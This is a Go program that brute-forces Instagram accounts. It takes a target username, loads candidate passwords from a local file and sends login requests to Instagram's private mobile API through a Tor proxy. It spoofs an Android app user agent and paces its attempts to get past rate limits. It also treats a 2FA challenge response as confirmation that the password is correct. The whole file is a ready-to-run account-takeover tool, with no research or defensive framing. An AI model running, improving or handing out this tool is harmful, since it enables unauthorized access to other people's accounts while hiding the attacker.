package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "net"
    "net/http"
    "os"
    "strings"
    "time"

    "golang.org/x/net/proxy"
)

const (
    API_URL    = "https://i.instagram.com/api/v1/"
    USER_AGENT = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
)

type InstagramResponse struct {
    Status    string `json:"status"`
    Message   string `json:"message"`
    ErrorType string `json:"error_type"`
    Challenge struct {
        URL string `json:"url"`
    } `json:"challenge"`
}

func checkTor() bool {
    conn, err := net.DialTimeout("tcp", "127.0.0.1:9050", 2*time.Second)
    if err == nil {
        conn.Close()
        return true
    }
    return false
}

func getTorClient() *http.Client {
    dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
    if err != nil {
        log.Fatalf("Can't connect to the proxy: %v\n", err)
    }
    transport := &http.Transport{Dial: dialer.Dial}
    return &http.Client{
        Transport: transport,
        Timeout:   15 * time.Second,
    }
}

func main() {
    fmt.Println("=== Instagram Login Tool + TOR (Manual Tor Mode) ===")

    // فقط چک کن Tor اجرا شده یا نه
    if !checkTor() {
        fmt.Println("❌ Tor is NOT running! Please open a new session and run 'tor' command, then try again.")
        return
    } else {
        fmt.Println("✅ Tor is running on 127.0.0.1:9050")
    }

    fmt.Print("Enter Instagram username: ")
    var username string
    fmt.Scanln(&username)

    passwords := loadPasswords()
    if len(passwords) == 0 {
        fmt.Println("No passwords found in password.txt!")
        return
    }

    fmt.Printf("\nLoaded %d passwords\n", len(passwords))
    fmt.Println("\nStarting login attempts via TOR...\n")

    client := getTorClient()
    for i, password := range passwords {
        fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
        success, response := tryLoginTor(client, username, password)
        if success || response.ErrorType == "checkpoint_challenge_required" {
            fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
            fmt.Printf("Username: %s\n", username)
            if response.ErrorType == "checkpoint_challenge_required" {
                fmt.Println("✅ Password is correct, but Instagram needs challenge/2FA.")
            }
            return
        } else {
            fmt.Printf("⚠️ Error: %s | ErrorType: %s\n", response.Message, response.ErrorType)
        }
        time.Sleep(6 * time.Second)
    }
    fmt.Println("\n❌ No valid password found!")
}

func tryLoginTor(client *http.Client, username, password string) (bool, InstagramResponse) {
    loginUrl := API_URL + "accounts/login/"
    data := "username=" + username + "&password=" + password + "&device_id=android-" + fmt.Sprint(time.Now().UnixNano())
    req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data))
    if err != nil {
        log.Printf("Error creating request: %v\n", err)
        return false, InstagramResponse{}
    }
    req.Header.Set("User-Agent", USER_AGENT)
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
    req.Header.Set("Accept", "*/*")
    req.Header.Set("Accept-Language", "en-US")
    req.Header.Set("X-IG-Capabilities", "3brTvw==")
    req.Header.Set("X-IG-Connection-Type", "WIFI")

    resp, err := client.Do(req)
    if err != nil {
        log.Printf("Error sending request: %v\n", err)
        return false, InstagramResponse{}
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Printf("Error reading response: %v\n", err)
        return false, InstagramResponse{}
    }
    var response InstagramResponse
    _ = json.Unmarshal(body, &response)
    success := response.Status == "ok" ||
        strings.Contains(string(body), "logged_in_user")
    return success, response
}

func loadPasswords() []string {
    file, err := os.Open("password.txt")
    if err != nil {
        return []string{}
    }
    defer file.Close()
    var passwords []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        pass := strings.TrimSpace(scanner.Text())
        if pass != "" {
            passwords = append(passwords, pass)
        }
    }
    return passwords
}

func maskPassword(password string) string {
    if len(password) <= 4 {
        return "****"
    }
    return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}
